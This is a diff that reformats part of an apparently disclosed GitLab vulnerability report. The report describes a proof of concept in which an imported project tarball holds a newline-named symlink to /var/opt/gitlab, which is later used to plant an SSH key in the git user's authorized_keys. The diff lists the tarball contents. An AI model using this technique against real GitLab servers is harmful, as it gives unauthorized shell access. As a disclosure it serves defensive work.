@@ -36,12 +36,13 @@ To reproduce the issue with these tarballs.
 
 * 1、create project evil_project by importing tarball1.tar.gz
 
-
+```
 root@10:/var/opt/gitlab/gitlab-rails/uploads/root# ls -alh evil_project/
 total 8.0K
 drwx------  2 git git 4.0K Jul 11 00:34 .
 lrwxrwxrwx  1 git git   15 Jul 11 00:34 .?evil -> /var/opt/gitlab
 drwxr-xr-x 10 git git 4.0K Jul 11 00:34 ..
+```
 here you can see a symbolic link is created.
 
 * 2、remove the project evil_project, while the upload directory of this project remains unpurged.
@@ -61,7 +62,9 @@ root@10:/var/opt/gitlab/.ssh# cat authorized_keys
 * POC
 ssh-rsa a_key_of_mine nyangawa
 For the content of these tarballs
+
 tarball1.tar.gz
+
 ```
 $ tar tvf tarball1.tar.gz 
 -rw-r--r-- asakawa/asakawa   5 2018-07-11 08:30 VERSION
@@ -69,6 +72,7 @@ $ tar tvf tarball1.tar.gz
 drwxr-xr-x asakawa/asakawa    0 2018-07-11 08:32 uploads/
 lrwxrwxrwx asakawa/asakawa    0 2018-07-11 08:32 uploads/.\nevil -> /var/opt/gitlab
 ```
+
 tarball2.tar.gz
 ```
 $ tar tvf tarball2.tar.gz 
